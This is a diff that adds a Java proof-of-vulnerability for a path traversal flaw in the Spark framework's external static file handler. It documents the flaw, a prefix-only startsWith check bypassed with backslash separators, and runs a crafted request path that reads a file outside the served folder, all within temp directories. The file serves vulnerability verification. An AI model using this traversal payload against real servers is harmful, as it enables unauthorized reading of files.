+package spark.resource;
+
+import java.io.BufferedReader;
+import java.io.File;
+import java.io.FileReader;
+import java.io.FileWriter;
+
+import spark.staticfiles.DirectoryTraversal;
+import spark.staticfiles.StaticFilesFolder;
+
+/**
+ * Proof-of-Vulnerability for CWE-022 (Path Traversal) in Spark's external
+ * static files handling.
+ *
+ * Root cause: {@link spark.staticfiles.DirectoryTraversal#protectAgainstForExternal(String)}
+ * validates the resolved file path with a bare {@code String.startsWith(...)} against
+ * the configured external folder, WITHOUT a path-separator boundary. A sibling
+ * directory whose name merely shares the configured folder's name as a prefix
+ * (e.g. base "/tmp/pov_ext_base" vs sibling "/tmp/pov_ext_base_secret") therefore
+ * passes the check.
+ *
+ * The traversal itself survives {@link UriPath#canonical(String)} because the
+ * attacker uses backslash separators: {@code canonical(...)} only understands '/'
+ * so it does not collapse the "..", and the backslashes are later turned into '/'
+ * by {@link spark.utils.StringUtils#cleanPath(String)} inside {@link ExternalResource},
+ * producing a real filesystem traversal.
+ *
+ * This class lives in package spark.resource so it can drive the exact same
+ * vulnerable code path the framework uses when serving an external static file:
+ *   ExternalResourceHandler.getResource(path)
+ *     -> UriPath.canonical(path)
+ *     -> AbstractResourceHandler.addPaths(base, path)
+ *     -> new ExternalResource(...) -> StringUtils.cleanPath (\ -> /)
+ *     -> DirectoryTraversal.protectAgainstForExternal(resolvedPath)   // flawed check
+ *     -> resource.getFile()                                           // file outside base
+ *
+ * Exit code contract:
+ *   - exit 0  => the vulnerability reproduced (a file OUTSIDE the configured
+ *                external static folder was served).
+ *   - exit 1  => the attack was blocked (patched behaviour).
+ */
+public class ExternalStaticFilesTraversalPoV {
+
+    private static final String SECRET_MARKER = "TOP_SECRET_OUTSIDE_STATIC_ROOT";
+
+    public static void main(String[] args) throws Exception {
+        File tmp = new File(System.getProperty("java.io.tmpdir"));
+
+        // Configured external static files folder (the ONLY directory that should be reachable).
+        File baseFolder = new File(tmp, "pov_ext_base");
+        baseFolder.mkdirs();
+        writeFile(new File(baseFolder, "index.html"), "public content");
+
+        // A sibling directory whose name shares the base folder's name as a prefix.
+        // This is what defeats the boundary-less startsWith() check.
+        File siblingFolder = new File(tmp, "pov_ext_base_secret");
+        siblingFolder.mkdirs();
+        File secretFile = new File(siblingFolder, "secret.txt");
+        writeFile(secretFile, SECRET_MARKER);
+
+        String basePath = baseFolder.getAbsolutePath();
+
+        // Configure the framework exactly like StaticFilesConfiguration.configureExternal() does.
+        StaticFilesFolder.externalConfiguredTo(basePath);
+        ExternalResourceHandler handler = new ExternalResourceHandler(basePath, "index.html");
+
+        // Attacker-controlled request path. Uses backslash separators so that
+        // UriPath.canonical() does not neutralise the "..". After a URL-decode in a
+        // real request this is what the servlet layer would hand to getResource().
+        String attackPath = "/.." + "\\" + siblingFolder.getName() + "\\secret.txt";
+        System.out.println("[pov] configured external folder : " + basePath);
+        System.out.println("[pov] StaticFilesFolder.external(): " + StaticFilesFolder.external());
+        System.out.println("[pov] attack request path        : " + attackPath);
+
+        AbstractFileResolvingResource resource;
+        try {
+            resource = handler.getResource(attackPath);
+        } catch (DirectoryTraversal.DirectoryTraversalDetection blocked) {
+            System.out.println("[pov] BLOCKED: traversal detected -> " + blocked.getMessage());
+            System.exit(1);
+            return;
+        }
+
+        if (resource == null) {
+            System.out.println("[pov] BLOCKED: handler returned null (no resource served).");
+            System.exit(1);
+            return;
+        }
+
+        File served = resource.getFile();
+        String servedCanonical = served.getCanonicalPath();
+        String baseCanonical = baseFolder.getCanonicalPath();
+
+        boolean escapesBase = !servedCanonical.equals(baseCanonical)
+                && !servedCanonical.startsWith(baseCanonical + File.separator);
+
+        String content;
+        try (BufferedReader r = new BufferedReader(new FileReader(served))) {
+            content = r.readLine();
+        }
+
+        System.out.println("[pov] served file                : " + servedCanonical);
+        System.out.println("[pov] served content             : " + content);
+        System.out.println("[pov] escapes configured folder  : " + escapesBase);
+
+        if (escapesBase && SECRET_MARKER.equals(content)) {
+            System.out.println("[pov] VULNERABLE: read a file OUTSIDE the external static folder "
+                    + "via path traversal (CWE-022).");
+            System.exit(0);
+        }
+
+        System.out.println("[pov] Not exploited: served file did not escape the configured folder.");
+        System.exit(1);
+    }
+
+    private static void writeFile(File f, String content) throws Exception {
+        try (FileWriter w = new FileWriter(f)) {
+            w.write(content);
+        }
+    }
+}
